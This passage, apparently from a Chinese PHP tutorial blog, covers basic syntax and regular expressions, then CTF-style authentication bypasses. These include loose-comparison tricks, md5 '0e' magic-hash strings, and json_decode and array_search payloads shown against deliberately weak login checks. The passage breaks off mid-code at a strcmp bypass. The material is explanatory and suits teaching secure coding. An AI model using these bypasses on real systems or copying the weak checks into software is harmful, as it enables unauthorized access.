class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$age</span> &lt; <span class="number">18</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;未成年人&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$age</span> &gt;= <span class="number">18</span> &amp;&amp; <span class="variable">$age</span> &lt; <span class="number">60</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;成年人&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;老年人&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>循环语句：使用循环语句可以重复执行一段代码块。常见的循环语句有 <code>for</code>、<code>while</code> 和 <code>foreach</code>。例如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">  <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fruits</span> = <span class="keyword">array</span>(<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Orange&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$fruits</span> <span class="keyword">as</span> <span class="variable">$fruit</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$fruit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="8"><li>函数：<br>函数是封装了一段可重复使用的代码块。它可以接受参数并返回一个值。以下是一个简单的函数示例：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Hello, &quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">greet</span>(<span class="string">&quot;John&quot;</span>); <span class="comment">// 调用函数并传递参数</span></span><br></pre></td></tr></table></figure><ol start="9"><li>数组：<br>数组是用于存储多个值的数据结构。在 PHP 中，数组可以包含不同类型的值，并且可以通过索引或关联键进行访问。以下是一个简单的数组示例：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fruits</span> = <span class="keyword">array</span>(<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Orange&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fruits</span>[<span class="number">0</span>]; <span class="comment">// 输出数组的第一个元素</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="string">&quot;age&quot;</span> =&gt; <span class="number">25</span>,</span><br><span class="line">  <span class="string">&quot;city&quot;</span> =&gt; <span class="string">&quot;New York&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person</span>[<span class="string">&quot;name&quot;</span>]; <span class="comment">// 输出数组中关联键为 &quot;name&quot; 的值</span></span><br></pre></td></tr></table></figure><ol start="10"><li>类：<br>类是面向对象编程的核心概念之一，用于封装数据和功能。一个类定义了一种对象的行为和属性。以下是一个简单的类示例：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, my name is &quot;</span> . <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot; and I am &quot;</span> . <span class="variable language_">$this</span>-&gt;age . <span class="string">&quot; years old.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">25</span>); <span class="comment">// 创建一个 Person 对象</span></span><br><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">greet</span>(); <span class="comment">// 调用类的方法</span></span><br></pre></td></tr></table></figure><p>在上面的示例中，<code>Person</code> 类具有 <code>name</code> 和 <code>age</code> 两个属性，以及 <code>__construct()</code> 构造函数和 <code>greet()</code> 方法。使用 <code>new</code> 关键字可以实例化一个类，并通过 <code>-&gt;</code> 运算符访问类的属性和方法。</p><h2 id="php的正则表达式"><a href="#php的正则表达式" class="headerlink" title="php的正则表达式"></a>php的正则表达式</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><ol><li>字符匹配：<ul><li><code>.</code>：匹配任意字符（除了换行符）。</li><li><code>\w</code>：匹配字母、数字、下划线。</li><li><code>\d</code>：匹配数字。</li><li><code>\s</code>：匹配空白字符（空格、制表符、换行符等）。</li></ul></li><li>重复匹配：<ul><li><code>*</code>：匹配前面的元素零次或多次。</li><li><code>+</code>：匹配前面的元素一次或多次。</li><li><code>?</code>：匹配前面的元素零次或一次。</li><li><code>&#123;n&#125;</code>：匹配前面的元素恰好n次。</li><li><code>&#123;n,&#125;</code>：匹配前面的元素至少n次。</li><li><code>&#123;n,m&#125;</code>：匹配前面的元素至少n次、最多m次。</li></ul></li><li>字符类：<ul><li><code>[abc]</code>：匹配’a’、’b’或’c’中的任意一个字符。</li><li><code>[^abc]</code>：匹配除了’a’、’b’和’c’以外的任意字符。</li><li><code>[a-z]</code>：匹配任意小写字母。</li><li><code>[A-Z]</code>：匹配任意大写字母。</li><li><code>[0-9]</code>：匹配任意数字。</li></ul></li><li>边界匹配：<ul><li><code>^</code>：匹配字符串的开始位置。</li><li><code>$</code>：匹配字符串的结束位置。</li><li><code>\b</code>：匹配单词的边界。</li></ul></li><li>分组和捕获：<ul><li><code>(...)</code>：创建一个捕获组。</li><li><code>(?:...)</code>：创建一个非捕获组。</li></ul></li></ol><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><ol><li><p>反向引用：</p><ul><li><p>使用<code>(...)</code>将模式中的一部分捕获为一个组。</p></li><li><p>可以使用<code>\n</code>（n为组的编号）来引用先前捕获的组。</p></li><li><p>例如，<code>(a)\1</code>将匹配连续出现的两个相同的字母”a”。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello Hello World World World&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(\b\w+\b)\s+\1/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$str</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配成功！重复的单词是：&quot;</span> . <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;未找到重复的单词。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//&quot;匹配成功！重复的单词是：Hello&quot;</span></span><br></pre></td></tr></table></figure><p>在上面的示例中，正则表达式模式<code>/(\b\w+\b)\s+\1/</code>包含以下部分：</p><ul><li><code>(\b\w+\b)</code>: 这是一个捕获组，用于匹配一个完整的单词。</li><li><code>\s+</code>: 匹配一个或多个空格字符。</li><li><code>\1</code>: 这是一个反向引用，引用了第一个捕获组所匹配的内容。</li></ul></li></ul></li><li><p>平衡组：</p><ul><li><p>使用平衡组可以匹配嵌套结构，如括号、HTML标签等。</p></li><li><p>通过在模式中使用递归引用来实现平衡组的匹配。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;(abc(def(ghi)))&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/</span></span><br><span class="line"><span class="string">    (?(DEFINE)</span></span><br><span class="line"><span class="string">        (?&lt;paren&gt; \( (?: [^()]+ | (?&amp;paren) )* \) )</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    ^ (?&amp;paren) $</span></span><br><span class="line"><span class="string">/x&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$str</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;括号匹配成功！&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;括号匹配失败。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//括号匹配成功</span></span><br></pre></td></tr></table></figure><p>在上面的示例中，正则表达式模式使用了平衡组的概念。这个模式包含以下部分：</p><ul><li><code>(?(DEFINE)...)</code>: 这是一个定义块，定义了一个名为 <code>&quot;paren&quot;</code> 的平衡组。</li><li><code>(?&lt;paren&gt; \( (?: [^()]+ | (?&amp;paren) )* \) )</code>: 这是名为 <code>&quot;paren&quot;</code> 的平衡组，用于匹配成对出现的括号。它使用了递归的方式，允许嵌套的括号。</li></ul><p>详细解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/</span></span><br><span class="line"><span class="string">    (?(DEFINE)</span></span><br><span class="line"><span class="string">        (?&lt;paren&gt; \( (?: [^()]+ | (?&amp;paren) )* \) )</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    ^ (?&amp;paren) $</span></span><br><span class="line"><span class="string">/x&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这个模式使用了平衡组的概念来匹配平衡的括号结构。</p><p>定义块：<code>(?(DEFINE)...)</code>定义了一个定义块，其中包含一个名为<code>paren</code> 的平衡组的定义。</p><p>在上面的定义块中，我们定义了名为paren的平衡组。它使用了递归的方式来匹配括号内的内容。</p><ul><li><code>&quot;\(&quot;</code>: 匹配左括号 <code>&quot;(&quot;</code>。</li><li><code>&quot;(?&quot;: [^()]+ | (?&amp;paren) )*</code>: 这是一个非捕获组，用于匹配括号内的内容。它可以匹配非括号字符<code>[^()]+</code> 或者递归引用<code>(?&amp;paren)</code>。这样就可以实现括号内的嵌套结构。</li><li><code>&quot;\)&quot;: 匹配右括号 &quot;)&quot;。</code></li></ul><p>引用：<code>^(?&amp;paren) $</code>是对<code>paren</code> 平衡组的引用，它用于匹配整个字符串是否符合平衡的括号结构。</p><ul><li><code>^</code>: 匹配字符串的开头。</li><li><code>(?&amp;paren)</code>: 这是对 <code>paren</code> 平衡组的引用，用于匹配平衡的括号结构。</li><li><code>$</code>: 匹配字符串的结尾。</li></ul></li></ul></li><li><p>断言：</p><ul><li><code>(?=...)</code>：正向肯定先行断言，要求后面的模式与其匹配，但不消耗字符。</li><li><code>(?!...)</code>：正向否定先行断言，要求后面的模式不与其匹配，但不消耗字符。</li><li><code>(?&lt;=...)</code>：反向肯定后行断言，要求前面的模式与其匹配，但不消耗字符。</li><li><code>(?&lt;!...)</code>：反向否定后行断言，要求前面的模式不与其匹配，但不消耗字符。</li></ul></li><li><p>修饰符：</p><ul><li><code>i</code>：忽略大小写。</li><li><code>m</code>：多行模式，使<code>^</code>和<code>$</code>匹配每行的开始和结束位置。</li><li><code>s</code>：使<code>.</code>匹配包括换行符在内的所有字符。</li><li><code>x</code>：忽略模式中的空白和注释。</li></ul></li></ol><h2 id="php中的一些技巧"><a href="#php中的一些技巧" class="headerlink" title="php中的一些技巧"></a>php中的一些技巧</h2><h3 id="php弱类型与强类型"><a href="#php弱类型与强类型" class="headerlink" title="php弱类型与强类型"></a>php弱类型与强类型</h3><h4 id="与"><a href="#与" class="headerlink" title="&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a == $b ;</span><br><span class="line">	$a === $b ;</span><br><span class="line">?&gt;  </span><br><span class="line">//=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</span><br><span class="line">// == 在进行比较的时候，会先将字符串类型转化成相同，再比较</span><br></pre></td></tr></table></figure><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;admin&quot; == 0); //true</span><br><span class="line">var_dump(&quot;1admin&quot;== 1); //true</span><br><span class="line">var_dump(&quot;admin1&quot;== 1); //false</span><br><span class="line">var_dump(&quot;admin1&quot;== 0); //true</span><br><span class="line">var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true </span><br><span class="line">?&gt;  //上述代码可自行测试</span><br><span class="line">    </span><br><span class="line"> // 观察上述代码</span><br><span class="line"> //&quot;admin&quot;==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</span><br><span class="line"> //&quot;1admin&quot;==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，即是&quot;admin1&quot;被转化成了0,为什么呢？？</span><br><span class="line"> //&quot;0e123456&quot;==&quot;0e456789&quot;相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等。</span><br></pre></td></tr></table></figure><p><code>php</code>手册：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;并且其数值值在整形的范围之内</span></span><br><span class="line"><span class="comment">该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">C</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span> + <span class="string">&quot;10.5&quot;</span>; <span class="comment">// $test=11.5(float)</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;-1.3e3&quot;</span>; <span class="comment">//$test=-1299(float)</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;bob-1.3e3&quot;</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;2admin&quot;</span>;<span class="comment">//$test=3(int)</span></span><br><span class="line"><span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;admin2&quot;</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">So that<span class="string">&#x27;s why &quot; &quot;admin1&quot;==1 =&gt;False &quot;</span></span><br></pre></td></tr></table></figure><h4 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$Username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$Username</span>)) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>) ) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$Username</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$logined</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;successful&quot;</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;login failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句</p><p>介绍一批md5开头是0e的字符串</p><p><strong>0e在比较的时候会将其视作为科学计数法</strong>，所以无论0e后面是什么，0的多少次方还是0。</p><p>键入**md5(‘240610708’) &#x3D;&#x3D; md5(‘QNKCDZO’)**成功绕过！</p><p>md5开头是0e的字符串（来源于网络）：</p><blockquote><p>QNKCDZO<br>0e830400451993494058024219903391</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s155964671a<br>0e342768416822451524974117254469</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s1091221200a<br>0e940624217856561557816327384675</p><p>s1885207154a<br>0e509367213418206700842008763514</p></blockquote><h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入一个json类型的字符串，json_decode函数解成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，<strong>但是可以利用0&#x3D;&#x3D;”admin”这种形式绕过</strong>.</p><p>**最终payload **</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message=<span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search is_array绕过"></a>array_search is_array绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$test</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$test</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;admin&quot;</span>,<span class="variable">$test</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: test[]=<span class="number">0</span><span class="comment">//可以绕过</span></span><br></pre></td></tr></table></figure><p>官方手册对array_search的介绍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">array_search</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> [], <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span> )</span><br></pre></td></tr></table></figure><p><code>$needle，$haystack必需，$strict可选</code> 函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;admin&quot;</span>,<span class="variable">$a</span>));  <span class="comment">// int(0) ==&gt; 返回键值0</span></span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(1) ==&gt; 返回键值1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>array_search函数 类似于 &#x3D;&#x3D; 也就是$a &#x3D;&#x3D;”admin” 当然是$a&#x3D;0 当然如果第三个参数为true则就不能绕过。</p><h4 id="strcmp漏洞绕过-php-v"><a href="#strcmp漏洞绕过-php-v" class="headerlink" title="strcmp漏洞绕过 php -v &lt;5.3"></a>strcmp漏洞绕过 php -v &lt;5.3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$password</span>=<span class="string">&quot;***************&quot;</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span 